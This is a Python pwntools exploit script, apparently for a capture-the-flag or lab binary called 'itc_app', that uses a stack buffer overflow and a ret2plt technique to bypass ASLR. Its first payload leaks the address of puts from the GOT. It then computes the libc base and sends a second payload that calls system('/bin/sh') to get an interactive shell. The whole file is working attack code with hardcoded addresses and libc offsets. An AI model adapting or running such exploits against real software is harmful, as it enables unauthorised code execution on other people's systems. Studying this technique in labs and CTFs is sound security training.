"""
References:
- https://docs.pwntools.com/en/stable/
- https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass
"""

import struct
import logging
from pwn import process, ELF, context

# Constants for exploit
BUFFER_SIZE = 132
PUTS_PLT_ADDRESS, MAIN_ADDRESS, PUTS_GOT_ADDRESS = 0x8048340, 0x804847b, 0x80497ac

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(message)s')


def construct_payload(buffer_size, *addresses):
    """Constructs a payload with a repeated 'A' character buffer, followed by the provided addresses."""
    payload = b'A' * buffer_size
    for address in addresses:
        payload += struct.pack("I", address)
    return payload


def exploit(binary_path):
    context.binary = ELF(binary_path)
    proc = process()

    initial_payload = construct_payload(BUFFER_SIZE, PUTS_PLT_ADDRESS, MAIN_ADDRESS, PUTS_GOT_ADDRESS)
    proc.sendline(initial_payload)

    welcome_detected, leaked_address = False, None
    for _ in range(10):
        try:
            line = proc.recvline()
            logging.debug(line)
            if welcome_detected and b"Welcome" in line:
                leaked_address = int.from_bytes(previous_line[:4], byteorder='little')
                libc_base_address = leaked_address - 0x731b0  # Offset for libc's puts
                logging.info(f"Leaked puts' libc Addr: {hex(leaked_address)}")
                logging.info(f"Libc base Addr: {hex(libc_base_address)}")
                break
            if b"Welcome" in line:
                welcome_detected = True
            previous_line = line
        except EOFError:
            break

    if leaked_address:
        final_payload = construct_payload(
            BUFFER_SIZE,
            libc_base_address + 0x4c830,  # libc system offset
            libc_base_address + 0x3c130,  # libc exit offset
            libc_base_address + 0x1b5fc8   # libc /bin/sh offset
        )
        proc.sendline(final_payload)
        proc.interactive()


if __name__ == "__main__":
    exploit('./itc_app')
